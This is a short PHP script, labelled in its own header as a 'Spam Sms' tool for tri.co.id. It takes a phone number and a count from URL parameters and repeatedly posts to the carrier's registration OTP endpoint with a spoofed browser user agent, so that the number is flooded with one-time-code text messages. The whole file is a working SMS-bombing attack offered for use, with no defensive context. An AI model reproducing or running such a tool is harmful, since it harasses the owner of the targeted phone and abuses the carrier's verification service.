<?php

/* 
tri.co.id Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS tri.co.id";
}else{
$limit = $_GET['limit'];
$no = $_GET['no'];
            $header = array(
		    'POST /daftar/generateOTP HTTP/1.1',
		    'Host: registrasi.tri.co.id',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
		    'Accept: application/json, text/javascript, */*; q=0.01',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate, br',
		    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
		    'X-Requested-With: XMLHttpRequest',
		    'Referer: https://registrasi.tri.co.id/daftar',
		    'Content-Length: 58',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://registrasi.tri.co.id/daftar/generateOTP');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 3;$x <= $limit ;$x++) {
    http("msisdn=".$no.""); 
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>